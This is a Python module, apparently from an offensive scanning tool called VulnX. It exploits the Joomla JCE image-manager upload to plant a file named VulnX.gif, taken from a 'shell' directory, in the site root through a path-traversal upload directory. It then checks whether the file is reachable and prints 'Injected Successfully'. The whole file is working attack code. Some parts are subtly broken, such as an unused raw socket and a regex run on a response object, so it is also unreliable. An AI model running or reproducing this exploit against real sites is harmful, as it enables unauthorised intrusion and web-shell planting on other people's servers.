import re
import random
import datetime
import requests
import socket
from common.uri_converter import convert_uri as hostd
now = datetime.datetime.now()
year = now.strftime('%Y')
month= now.strftime('%m')

from common.colors import W, G, R, Y, B
from common.vxrequest import sendrequest as vxpost
from common.vxrequest import getrequest as vxget

def joomla_comjce(url,headers):
    ip = socket.gethostbyname(hostd(url))
    headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
    endpoint = url+"/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20"
    data = {
            'upload-dir':'./../../',
            'upload-overwrite':0,
            'Filedata' : [open('./shell/VulnX.gif','rb')],
            'action':'Upload'
    }
    content = vxpost(endpoint,data,headers,15)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((url, 80))
    path_shell = url + "/VulnX.gif"
    res=requests.get(path_shell, headers)
    if re.findall(r'/image/gif/', res):
        print ('%s [%s+%s] Com Jce%s ------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,path_shell,W))
    else:
        print ('%s [%s-%s] Com Jce%s ------- %s FAIL%s' %(W,R,W,W,R,W))
